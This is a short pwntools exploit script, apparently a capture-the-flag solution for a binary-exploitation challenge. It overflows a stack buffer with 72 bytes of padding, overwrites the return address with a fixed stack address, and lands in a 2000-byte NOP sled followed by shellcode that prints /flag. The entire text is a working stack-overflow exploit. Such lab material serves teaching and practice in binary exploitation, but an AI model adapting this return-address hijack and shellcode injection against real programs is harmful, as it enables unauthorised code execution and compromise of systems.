from pwn import *
from pwn import asm, context, process

context.update(arch="amd64", os="linux")
context.log_level = "error"

binary_path = "/challenge/binary-exploitation-hijack-to-shellcode"
p = process(binary_path, env={})

target_address = 0x00007FFFFFFFDD70

# 0x40 + 8
offset = 72
padding = b"A" * offset
shellcode = asm(shellcraft.cat("/flag"))

nop_sled = b"\x90" * 2000

# Payload 结构：[72padding] + [RetAddr] + [2000nop sled] + [Shellcode]
payload = padding + p64(target_address) + nop_sled + shellcode

p.send(payload)

p.interactive()
